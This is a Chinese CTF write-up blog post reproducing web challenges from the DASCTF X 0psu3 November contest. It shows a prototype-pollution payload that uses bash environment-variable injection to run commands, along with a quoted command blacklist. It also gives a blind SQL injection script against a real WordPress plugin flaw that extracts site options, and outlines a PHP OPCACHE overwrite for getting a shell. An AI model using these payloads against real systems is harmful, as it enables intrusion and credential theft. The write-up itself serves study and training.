@@ -1,0 +1,290 @@
+<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0"><title>DASCTF X 0psu3十一月挑战赛   WEB题目复现 | XiLitter</title><meta name="author" content="XiLitter"><meta name="copyright" content="XiLitter"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="0x01 前言十一月的buu比赛没时间打，后续有时间就打算复现了一下，有一道 java 题环境关了没复现成还是挺可惜的。 0x02 题目复现realrce题目附件是源码 node.js写的，主要看app.js的代码   就定义了一个根路由，首先分析这个代码比较关键的点 proc_execSync函数执行命令，将命令执行的结果返回给客户端，所以想要rce，必须对cmd_rce赋值，而cmd_rce属">
+<meta property="og:type" content="article">
+<meta property="og:title" content="DASCTF X 0psu3十一月挑战赛   WEB题目复现">
+<meta property="og:url" content="https://xilitter.github.io/2023/12/06/DASCTF-X-0psu3%E5%8D%81%E4%B8%80%E6%9C%88%E6%8C%91%E6%88%98%E8%B5%9B-WEB%E9%A2%98%E7%9B%AE%E5%A4%8D%E7%8E%B0/index.html">
+<meta property="og:site_name" content="XiLitter">
+<meta property="og:description" content="0x01 前言十一月的buu比赛没时间打，后续有时间就打算复现了一下，有一道 java 题环境关了没复现成还是挺可惜的。 0x02 题目复现realrce题目附件是源码 node.js写的，主要看app.js的代码   就定义了一个根路由，首先分析这个代码比较关键的点 proc_execSync函数执行命令，将命令执行的结果返回给客户端，所以想要rce，必须对cmd_rce赋值，而cmd_rce属">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://xilitter.github.io/img/art04.jpeg">
+<meta property="article:published_time" content="2023-12-06T03:42:39.000Z">
+<meta property="article:modified_time" content="2023-12-06T03:54:10.668Z">
+<meta property="article:author" content="XiLitter">
+<meta property="article:tag" content="ctf">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://xilitter.github.io/img/art04.jpeg"><link rel="shortcut icon" href="/img/favicon.jpg"><link rel="canonical" href="https://xilitter.github.io/2023/12/06/DASCTF-X-0psu3%E5%8D%81%E4%B8%80%E6%9C%88%E6%8C%91%E6%88%98%E8%B5%9B-WEB%E9%A2%98%E7%9B%AE%E5%A4%8D%E7%8E%B0/index.html"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css" media="print" onload="this.media='all'"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox.min.css" media="print" onload="this.media='all'"><script>const GLOBAL_CONFIG = { 
+  root: '/',
+  algolia: undefined,
+  localSearch: {"path":"/search.xml","preload":false,"languages":{"hits_empty":"找不到您查询的内容：${query}"}},
+  translate: undefined,
+  noticeOutdate: undefined,
+  highlight: {"plugin":"highlighjs","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false},
+  copy: {
+    success: '复制成功',
+    error: '复制错误',
+    noSupport: '浏览器不支持'
+  },
+  relativeDate: {
+    homepage: false,
+    post: false
+  },
+  runtime: '',
+  date_suffix: {
+    just: '刚刚',
+    min: '分钟前',
+    hour: '小时前',
+    day: '天前',
+    month: '个月前'
+  },
+  copyright: undefined,
+  lightbox: 'mediumZoom',
+  Snackbar: undefined,
+  source: {
+    justifiedGallery: {
+      js: 'https://cdn.jsdelivr.net/npm/flickr-justified-gallery/dist/fjGallery.min.js',
+      css: 'https://cdn.jsdelivr.net/npm/flickr-justified-gallery/dist/fjGallery.min.css'
+    }
+  },
+  isPhotoFigcaption: false,
+  islazyload: false,
+  isAnchor: false,
+  percent: {
+    toc: true,
+    rightside: false,
+  }
+}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
+  title: 'DASCTF X 0psu3十一月挑战赛   WEB题目复现',
+  isPost: true,
+  isHome: false,
+  isHighlightShrink: false,
+  isToc: true,
+  postUpdate: '2023-12-06 11:54:10'
+}</script><noscript><style type="text/css">
+  #nav {
+    opacity: 1
+  }
+  .justified-gallery img {
+    opacity: 1
+  }
+
+  #recent-posts time,
+  #post-meta time {
+    display: inline !important
+  }
+</style></noscript><script>(win=>{
+    win.saveToLocal = {
+      set: function setWithExpiry(key, value, ttl) {
+        if (ttl === 0) return
+        const now = new Date()
+        const expiryDay = ttl * 86400000
+        const item = {
+          value: value,
+          expiry: now.getTime() + expiryDay,
+        }
+        localStorage.setItem(key, JSON.stringify(item))
+      },
+
+      get: function getWithExpiry(key) {
+        const itemStr = localStorage.getItem(key)
+
+        if (!itemStr) {
+          return undefined
+        }
+        const item = JSON.parse(itemStr)
+        const now = new Date()
+
+        if (now.getTime() > item.expiry) {
+          localStorage.removeItem(key)
+          return undefined
+        }
+        return item.value
+      }
+    }
+  
+    win.getScript = url => new Promise((resolve, reject) => {
+      const script = document.createElement('script')
+      script.src = url
+      script.async = true
+      script.onerror = reject
+      script.onload = script.onreadystatechange = function() {
+        const loadState = this.readyState
+        if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+        script.onload = script.onreadystatechange = null
+        resolve()
+      }
+      document.head.appendChild(script)
+    })
+  
+    win.getCSS = (url,id = false) => new Promise((resolve, reject) => {
+      const link = document.createElement('link')
+      link.rel = 'stylesheet'
+      link.href = url
+      if (id) link.id = id
+      link.onerror = reject
+      link.onload = link.onreadystatechange = function() {
+        const loadState = this.readyState
+        if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+        link.onload = link.onreadystatechange = null
+        resolve()
+      }
+      document.head.appendChild(link)
+    })
+  
+      win.activateDarkMode = function () {
+        document.documentElement.setAttribute('data-theme', 'dark')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
+        }
+      }
+      win.activateLightMode = function () {
+        document.documentElement.setAttribute('data-theme', 'light')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
+        }
+      }
+      const t = saveToLocal.get('theme')
+    
+          if (t === 'dark') activateDarkMode()
+          else if (t === 'light') activateLightMode()
+        
+      const asideStatus = saveToLocal.get('aside-status')
+      if (asideStatus !== undefined) {
+        if (asideStatus === 'hide') {
+          document.documentElement.classList.add('hide-aside')
+        } else {
+          document.documentElement.classList.remove('hide-aside')
+        }
+      }
+    
+    const detectApple = () => {
+      if(/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)){
+        document.documentElement.classList.add('apple')
+      }
+    }
+    detectApple()
+    })(window)</script><meta name="generator" content="Hexo 6.3.0"></head><body><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img is-center"><img src="/img/avatar.jpg" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="sidebar-site-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">61</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">35</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">10</div></a></div><hr/><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 主页</span></a></div><div class="menus_item"><a class="site-page group" href="javascript:void(0);"><i class="fa-fw fa fa-graduation-cap"></i><span> 博文</span><i class="fas fa-chevron-down"></i></a><ul class="menus_item_child"><li><a class="site-page child" href="/categories/"><i class="fa-fw fa fa-archive"></i><span> 分类</span></a></li><li><a class="site-page child" href="/tags/"><i class="fa-fw fa fa-tags"></i><span> 标签</span></a></li><li><a class="site-page child" href="/archives/"><i class="fa-fw fa fa-folder-open"></i><span> 归档</span></a></li></ul></div><div class="menus_item"><a class="site-page group" href="javascript:void(0);"><i class="fa-fw fas fa-list"></i><span> 生活</span><i class="fas fa-chevron-down"></i></a><ul class="menus_item_child"><li><a class="site-page child" href="/shuoshuo/"><i class="fa-fw fa fa-comments-o"></i><span> 分享</span></a></li><li><a class="site-page child" href="/photos/"><i class="fa-fw fa fa-camera-retro"></i><span> 相册</span></a></li><li><a class="site-page child" href="/music/"><i class="fa-fw fa fa-music"></i><span> 音乐</span></a></li><li><a class="site-page child" href="/movies/"><i class="fa-fw fas fa-video"></i><span> 影视</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fa fa-link"></i><span> 友链</span></a></div><div class="menus_item"><a class="site-page" href="/comment/"><i class="fa-fw fa fa-paper-plane"></i><span> 留言板</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> 关于笔者</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url('/img/art04.jpeg')"><nav id="nav"><span id="blog-info"><a href="/" title="XiLitter"><span class="site-name">XiLitter</span></a></span><div id="menus"><div id="search-button"><a class="site-page social-icon search" href="javascript:void(0);"><i class="fas fa-search fa-fw"></i><span> 搜索</span></a></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 主页</span></a></div><div class="menus_item"><a class="site-page group" href="javascript:void(0);"><i class="fa-fw fa fa-graduation-cap"></i><span> 博文</span><i class="fas fa-chevron-down"></i></a><ul class="menus_item_child"><li><a class="site-page child" href="/categories/"><i class="fa-fw fa fa-archive"></i><span> 分类</span></a></li><li><a class="site-page child" href="/tags/"><i class="fa-fw fa fa-tags"></i><span> 标签</span></a></li><li><a class="site-page child" href="/archives/"><i class="fa-fw fa fa-folder-open"></i><span> 归档</span></a></li></ul></div><div class="menus_item"><a class="site-page group" href="javascript:void(0);"><i class="fa-fw fas fa-list"></i><span> 生活</span><i class="fas fa-chevron-down"></i></a><ul class="menus_item_child"><li><a class="site-page child" href="/shuoshuo/"><i class="fa-fw fa fa-comments-o"></i><span> 分享</span></a></li><li><a class="site-page child" href="/photos/"><i class="fa-fw fa fa-camera-retro"></i><span> 相册</span></a></li><li><a class="site-page child" href="/music/"><i class="fa-fw fa fa-music"></i><span> 音乐</span></a></li><li><a class="site-page child" href="/movies/"><i class="fa-fw fas fa-video"></i><span> 影视</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fa fa-link"></i><span> 友链</span></a></div><div class="menus_item"><a class="site-page" href="/comment/"><i class="fa-fw fa fa-paper-plane"></i><span> 留言板</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> 关于笔者</span></a></div></div><div id="toggle-menu"><a class="site-page" href="javascript:void(0);"><i class="fas fa-bars fa-fw"></i></a></div></div></nav><div id="post-info"><h1 class="post-title">DASCTF X 0psu3十一月挑战赛   WEB题目复现</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2023-12-06T03:42:39.000Z" title="发表于 2023-12-06 11:42:39">2023-12-06</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2023-12-06T03:54:10.668Z" title="更新于 2023-12-06 11:54:10">2023-12-06</time></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-wordcount"><i class="far fa-file-word fa-fw post-meta-icon"></i><span class="post-meta-label">字数总计:</span><span class="word-count">2.6k</span><span class="post-meta-separator">|</span><i class="far fa-clock fa-fw post-meta-icon"></i><span class="post-meta-label">阅读时长:</span><span>10分钟</span></span><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title="DASCTF X 0psu3十一月挑战赛   WEB题目复现"><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">阅读量:</span><span id="busuanzi_value_page_pv"><i class="fa-solid fa-spinner fa-spin"></i></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container"><h2 id="0x01-前言"><a href="#0x01-前言" class="headerlink" title="0x01 前言"></a>0x01 前言</h2><p>十一月的buu比赛没时间打，后续有时间就打算复现了一下，有一道 java 题环境关了没复现成还是挺可惜的。</p>
+<h2 id="0x02-题目复现"><a href="#0x02-题目复现" class="headerlink" title="0x02 题目复现"></a>0x02 题目复现</h2><h3 id="realrce"><a href="#realrce" class="headerlink" title="realrce"></a>realrce</h3><p>题目附件是源码</p>
+<p>node.js写的，主要看app.js的代码</p>
+<img src="/2023/12/06/DASCTF-X-0psu3%E5%8D%81%E4%B8%80%E6%9C%88%E6%8C%91%E6%88%98%E8%B5%9B-WEB%E9%A2%98%E7%9B%AE%E5%A4%8D%E7%8E%B0/1.png" class>
+
+<p>就定义了一个根路由，首先分析这个代码比较关键的点</p>
+<p>proc_execSync函数执行命令，将命令执行的结果返回给客户端，所以想要rce，必须对cmd_rce赋值，而cmd_rce属性在代码之前并没有定义，在上面有merge函数处理，可以利用原型链污染对cmd_rce赋值。</p>
+<p>在这个函数里cmd_rce的过滤</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cmd_rce.replace(/\r?\n/g,&quot;&quot;)   替换换行符</span><br><span class="line">replace(/[a-zA-Z0-9 ]+=[a-zA-Z0-9 ]+/g,&quot;114514&quot;)   替换形如key=value格式的内容</span><br><span class="line">replace(/(\$\d+)|(\$SHELL)|(\$_)|(\$\()|(\$&#123;)/g,&quot;114514&quot;)    替换形如$132等格式的内容</span><br><span class="line">replace(/(\&#x27;\/)|(\&quot;\/)|(\&quot;\.)|(\&quot;\.)|(\&#x27;~)|(\&quot;~)|(\.\/+)/,&quot;114514&quot;)</span><br><span class="line">replace(/(\&#x27;\/)|(\&quot;\/)|(\&quot;\.)|(\&quot;\.)|(\&#x27;~)|(\&quot;~)|(\.\/+)/,&quot;114514&quot;)    替换例如/path,/dir/格式的内容</span><br></pre></td></tr></table></figure>
+
+<p>限制的真多，但是在这道题还远远不止，继续往下看</p>
+<p>首先对我们输入的内容进行waf过滤</p>
+<img src="/2023/12/06/DASCTF-X-0psu3%E5%8D%81%E4%B8%80%E6%9C%88%E6%8C%91%E6%88%98%E8%B5%9B-WEB%E9%A2%98%E7%9B%AE%E5%A4%8D%E7%8E%B0/2.png" class>
+
+<p>类似于一个递归函数，先将输入的内容url解码，然后检测黑名单，这三个就是原型链污染的关键字符串。常规的绕过是不可行的，在捕获异常这可以返回 false，尝试让 decodeURIComponent 函数报错就可以了</p>
+<p>decodeURIComponent 是一个url解码函数，当输入的字符串不满足这个函数解码的格式就会抛出异常，那怎么找到这个错误格式的url编码呢，可以满足上面代码的匹配规则然后遍历url编码</p>
+<p>%ff就能够满足条件</p>
+<img src="/2023/12/06/DASCTF-X-0psu3%E5%8D%81%E4%B8%80%E6%9C%88%E6%8C%91%E6%88%98%E8%B5%9B-WEB%E9%A2%98%E7%9B%AE%E5%A4%8D%E7%8E%B0/3.png" class>
+
+<p>那么waf就能够绕过成功了，继续往下看，进入到 Door_lock 函数</p>
+<img src="/2023/12/06/DASCTF-X-0psu3%E5%8D%81%E4%B8%80%E6%9C%88%E6%8C%91%E6%88%98%E8%B5%9B-WEB%E9%A2%98%E7%9B%AE%E5%A4%8D%E7%8E%B0/4.png" class>
+
+<p>要让 Door_lock 函数返回true，即要满足 if判断条件，首先看 LockCylinder 函数</p>
+<img src="/2023/12/06/DASCTF-X-0psu3%E5%8D%81%E4%B8%80%E6%9C%88%E6%8C%91%E6%88%98%E8%B5%9B-WEB%E9%A2%98%E7%9B%AE%E5%A4%8D%E7%8E%B0/5.png" class>
+
+<p>对输入的内容过滤掉黑名单中的字符，然后赋值为key，key必须要满足为纯字母</p>
+<p>继续看 check_cmd 函数b</p>
+<img src="/2023/12/06/DASCTF-X-0psu3%E5%8D%81%E4%B8%80%E6%9C%88%E6%8C%91%E6%88%98%E8%B5%9B-WEB%E9%A2%98%E7%9B%AE%E5%A4%8D%E7%8E%B0/6.png" class>
+
+<p>过滤的东西太多了，截图截不下来。该题目的环境变量没删，所以有非预期，执行env即可得到flag</p>
+<img src="/2023/12/06/DASCTF-X-0psu3%E5%8D%81%E4%B8%80%E6%9C%88%E6%8C%91%E6%88%98%E8%B5%9B-WEB%E9%A2%98%E7%9B%AE%E5%A4%8D%E7%8E%B0/7.png" class>
+
+<p>而出题人写的WP是利用环境变量注入来RCE</p>
+<p><a target="_blank" rel="noopener" href="https://www.leavesongs.com/PENETRATION/how-I-hack-bash-through-environment-injection.html">我是如何利用环境变量注入执行任意命令 | 离别歌 (leavesongs.com)</a></p>
+<p>p神好久之前写的了，放官方exp</p>
+<figure class="highlight json"><table><tr><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">  <span class="attr">&quot;msg&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;name&quot;</span><span class="punctuation">:</span> <span class="string">&quot;%ff&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;age&quot;</span><span class="punctuation">:</span> <span class="number">25</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;city&quot;</span><span class="punctuation">:</span> <span class="string">&quot;Example City&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;__proto__&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">      <span class="attr">&quot;cmd_rce&quot;</span><span class="punctuation">:</span><span class="string">&quot;env $&#x27;BASH_FUNC_echo%%=() &#123; id;&#125;&#x27; bash -c &#x27;echo 123&#x27;&quot;</span></span><br><span class="line">    <span class="punctuation">&#125;</span></span><br><span class="line">  <span class="punctuation">&#125;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure>
+
+<p>为啥这个exp能够绕过waf，回头继续看 Door_lock 函数的过滤</p>
+<p>在 check_cmd 函数中首先消去空格再进行过滤，黑名单写的挺多，但是检测的时候比较刁钻了</p>
+<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (cmd.<span class="title function_">includes</span>(command[i] + <span class="string">&#x27;&amp;&#x27;</span>) || cmd.<span class="title function_">includes</span>(<span class="string">&#x27;&amp;&#x27;</span> + command[i]) || cmd.<span class="title function_">includes</span>(command[i] + <span class="string">&#x27;|&#x27;</span>) || cmd.<span class="title function_">includes</span>(<span class="string">&#x27;|&#x27;</span> + command[i]) || cmd.<span class="title function_">includes</span>(<span class="string">&#x27;;&#x27;</span> + command[i]) || cmd.<span class="title function_">includes</span>(<span class="params"><span class="string">&#x27;(&#x27;</span> + command[i]</span>) || cmd.<span class="title function_">includes</span>(<span class="string">&#x27;/&#x27;</span> + command[i])) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure>
+
+<p>再看另一个 LockCylinder 函数，它会去掉存在以下黑名单的字符</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[&quot;&amp;&amp;&quot;, &quot;||&quot;, &quot;&amp;&quot;, &quot;|&quot;, &quot;&gt;&quot;, &quot;*&quot;, &quot;+&quot;, &quot;$&quot;, &quot;;&quot;]</span><br></pre></td></tr></table></figure>
+
+<p>刚开始没太看懂是怎么绕过的，本地贴代码调试一下就明白了，所以说，分析代码还是得多调试</p>
+<img src="/2023/12/06/DASCTF-X-0psu3%E5%8D%81%E4%B8%80%E6%9C%88%E6%8C%91%E6%88%98%E8%B5%9B-WEB%E9%A2%98%E7%9B%AE%E5%A4%8D%E7%8E%B0/8.png" class>
+
+<p>当遍历到$字符，满足黑名单检测，所以就将 env 字符串放进数组里，把exp分割了</p>
+<p>最后正则检测的时候，只检测第一个数组元素，也就是env，显然是满足条件的。所以该exp是能够绕过waf并且能够任意命令执行。</p>
+<p>waf写的很刁钻，好像是刻意为了满足环境变量注入rce的命令格式来写的，非常好奇还有没有其他能够任意命令执行的waf绕过方式。</p>
+<h3 id="EzPenetration"><a href="#EzPenetration" class="headerlink" title="EzPenetration"></a>EzPenetration</h3><p>题目源自真实渗透案例</p>
+<p>打开题目是一个 wordpress 的站点，扫描了一下目录，有个后台登录，其他的也没啥，看官方WP是用wpscan扫漏洞，但是我kali的wpscan死活扫不到。</p>
+<p>扫出来的是一个sql注入：<strong>Registrations for the Events Calendar &lt; 2.7.6 - Unauthenticated SQL Injection</strong></p>
+<p>查了一下，有poc</p>
+<img src="/2023/12/06/DASCTF-X-0psu3%E5%8D%81%E4%B8%80%E6%9C%88%E6%8C%91%E6%88%98%E8%B5%9B-WEB%E9%A2%98%E7%9B%AE%E5%A4%8D%E7%8E%B0/9.png" class>
+
+<p>查看语句正确，回显success</p>
+<img src="/2023/12/06/DASCTF-X-0psu3%E5%8D%81%E4%B8%80%E6%9C%88%E6%8C%91%E6%88%98%E8%B5%9B-WEB%E9%A2%98%E7%9B%AE%E5%A4%8D%E7%8E%B0/10.png" class>
+
+<p>查询语句错误，回显error</p>
+<img src="/2023/12/06/DASCTF-X-0psu3%E5%8D%81%E4%B8%80%E6%9C%88%E6%8C%91%E6%88%98%E8%B5%9B-WEB%E9%A2%98%E7%9B%AE%E5%A4%8D%E7%8E%B0/11.png" class>
+
+<p>利用不同的回显可以盲注</p>
+<p>稍微修改了一下官方wp的脚本</p>
+<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="comment">#! /bin/python</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>():</span><br><span class="line">    session = requests.Session()</span><br><span class="line">    result = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    i = <span class="built_in">len</span>(result)</span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        i = i + <span class="number">1</span></span><br><span class="line">        head = <span class="number">30</span></span><br><span class="line">        tail = <span class="number">130</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">while</span> head &lt; tail:</span><br><span class="line">            mid = (head + tail) &gt;&gt; <span class="number">1</span></span><br><span class="line">            paramsPost = &#123;<span class="string">&quot;email&quot;</span>: <span class="string">&quot;r3tr0young@gmail.com&quot;</span>,</span><br><span class="line">                          <span class="string">&quot;event_id&quot;</span>: <span class="string">f&quot;3 union select 1,2,3,4,5,6,7,8,9,database() from wp_users where 0^(select(select ascii(substr(group_concat(option_name,0x7e,option_value),<span class="subst">&#123;i&#125;</span>,1)) from wp_options where option_id = 15)&gt;<span class="subst">&#123;mid&#125;</span>)-- &quot;</span>&#125;</span><br><span class="line">            cookies = &#123;<span class="string">&quot;wordpress_test_cookie&quot;</span>: <span class="string">&quot;WP%20Cookie%20check&quot;</span>&#125;</span><br><span class="line">            response = session.post(<span class="string">&quot;http://node4.buuoj.cn:26770/wp-admin/admin-ajax.php?action=rtec_send_unregister_link&quot;</span>, data=paramsPost,cookies=cookies)</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> <span class="string">&quot;success&quot;</span> <span class="keyword">in</span> response.text:</span><br><span class="line">                head = mid + <span class="number">1</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                tail = mid</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> head != <span class="number">30</span>:</span><br><span class="line">            result += <span class="built_in">chr</span>(head)</span><br><span class="line">            <span class="built_in">print</span>(result)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure>
+
+<p>查询 wp_options 表的 option_name 和 option_value 两个字段，表中第十五行，爆破出管理员邮箱</p>
+<img src="/2023/12/06/DASCTF-X-0psu3%E5%8D%81%E4%B8%80%E6%9C%88%E6%8C%91%E6%88%98%E8%B5%9B-WEB%E9%A2%98%E7%9B%AE%E5%A4%8D%E7%8E%B0/12.png" class>
+
+<p>在表中第十六行中，找到了类似于密码的东西</p>
+<img src="/2023/12/06/DASCTF-X-0psu3%E5%8D%81%E4%B8%80%E6%9C%88%E6%8C%91%E6%88%98%E8%B5%9B-WEB%E9%A2%98%E7%9B%AE%E5%A4%8D%E7%8E%B0/13.png" class>
+
+<p>在后台登录页有个忘记密码，可以通过邮箱重置密码，然后登录到后台</p>
+<p>复现的时候邮箱好像不管用了，登录到后台后安装 wp-file-manager 漏洞插件来rce。</p>
+<h3 id="single-php"><a href="#single-php" class="headerlink" title="single_php"></a>single_php</h3><p>0解题，打开题目，用 highlight_file 高亮函数来显示代码</p>
+<img src="/2023/12/06/DASCTF-X-0psu3%E5%8D%81%E4%B8%80%E6%9C%88%E6%8C%91%E6%88%98%E8%B5%9B-WEB%E9%A2%98%E7%9B%AE%E5%A4%8D%E7%8E%B0/14.png" class>
+
+<p>一段很短的php代码，存在反序列化，但是只能执行一个无参的函数，例如phpinfo()，在上面html里还有另一个文件</p>
+<img src="/2023/12/06/DASCTF-X-0psu3%E5%8D%81%E4%B8%80%E6%9C%88%E6%8C%91%E6%88%98%E8%B5%9B-WEB%E9%A2%98%E7%9B%AE%E5%A4%8D%E7%8E%B0/15.png" class>
+
+<img src="/2023/12/06/DASCTF-X-0psu3%E5%8D%81%E4%B8%80%E6%9C%88%E6%8C%91%E6%88%98%E8%B5%9B-WEB%E9%A2%98%E7%9B%AE%E5%A4%8D%E7%8E%B0/16.png" class>
+
+<p>只允许本地回环ip访问，看来只能打ssrf了，可以上传压缩包，并且解压到tmp目录下。唯一执行命令的地方就是exec，本来想着在上传的文件名注入命令，单引号闭合可以任意命令执行，但是回头再看，对上传的文件名重命名了，用的是tmp_name，貌似不可控</p>
+<p>官方wp说是利用OPCACHE缓存文件来RCE，在比赛中我应该写不出来，因为根本没了解这个</p>
+<p>现在开始了解，OPCACHE是php的一个扩展。当用户发出一个请求时，解析当前的php文件生成计算机代码opcode，然后执行。而OPCACHE扩展将解析好的php文件的字节码存放在共享内存中，当再次请求的php文件没有变化，它会去共享内存里拿，而避免了再次编译，直接执行内存里的opcode。减少计算机的开销。</p>
+<p>相关文章：<a target="_blank" rel="noopener" href="https://www.cnblogs.com/xhds/p/13239331.html"><a target="_blank" rel="noopener" href="https://www.cnblogs.com/xhds/p/13239331.html">php7的Opcache getshell</a></a></p>
+<p>执行phpinfo()；看看题目中是否开启了这个扩展</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">siroha</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$koi</span> = <span class="keyword">array</span>(<span class="string">&quot;zhanjiangdiyishenqing&quot;</span>=&gt;<span class="string">&quot;phpinfo&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> <span class="title function_ invoke__">siroha</span>();</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>);</span><br></pre></td></tr></table></figure>
+
+<img src="/2023/12/06/DASCTF-X-0psu3%E5%8D%81%E4%B8%80%E6%9C%88%E6%8C%91%E6%88%98%E8%B5%9B-WEB%E9%A2%98%E7%9B%AE%E5%A4%8D%E7%8E%B0/17.png" class>
+
+<p>将缓存文件放在了tmp目录下，题目环境为8.2.10的php环境</p>
+<p>本地拉一个相同环境的docker，下载该OPCACHE扩展，在自己容器上新建一个phpinfo，运行</p>
+<img src="/2023/12/06/DASCTF-X-0psu3%E5%8D%81%E4%B8%80%E6%9C%88%E6%8C%91%E6%88%98%E8%B5%9B-WEB%E9%A2%98%E7%9B%AE%E5%A4%8D%E7%8E%B0/18.png" class>
+
+<p>在该目录下生成了一个phpinfo.php.bin二进制文件，也就是解析后的opcode</p>
+<p>我们本地写一个能够任意命令执行的index.php，生成的缓存文件上传题目服务器，并且覆盖掉原有的缓存文件，当再次访问index.php，该文件的代码不发生变化，会直接执行缓存文件里的opcode，就能rce了。将本地的缓存文件下载下来，用010打开看</p>
+<img src="/2023/12/06/DASCTF-X-0psu3%E5%8D%81%E4%B8%80%E6%9C%88%E6%8C%91%E6%88%98%E8%B5%9B-WEB%E9%A2%98%E7%9B%AE%E5%A4%8D%E7%8E%B0/19.png" class>
+
+<p>有一串md5值，也是tmp目录下的文件名，叫做system_id，计算的php代码</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="title function_ invoke__">md5</span>(<span class="string">&quot;8.2.6API420220829,NTSBIN_4888(size_t)8\002&quot;</span>));</span><br></pre></td></tr></table></figure>
+
+<p>而在题目环境中又开启了时间戳验证</p>
+<img src="/2023/12/06/DASCTF-X-0psu3%E5%8D%81%E4%B8%80%E6%9C%88%E6%8C%91%E6%88%98%E8%B5%9B-WEB%E9%A2%98%E7%9B%AE%E5%A4%8D%E7%8E%B0/20.png" class>
+
+<p>所以只能写脚本上传了。首先本地docker里编写一个可以rce的index.php</p>
+<img src="/2023/12/06/DASCTF-X-0psu3%E5%8D%81%E4%B8%80%E6%9C%88%E6%8C%91%E6%88%98%E8%B5%9B-WEB%E9%A2%98%E7%9B%AE%E5%A4%8D%E7%8E%B0/21.png" class>
+
+<p>然后将它的缓存文件下载下来，用脚本修改时间戳，并且伪造上传数据</p>
+<p>直接贴上官方WP里的python脚本</p>
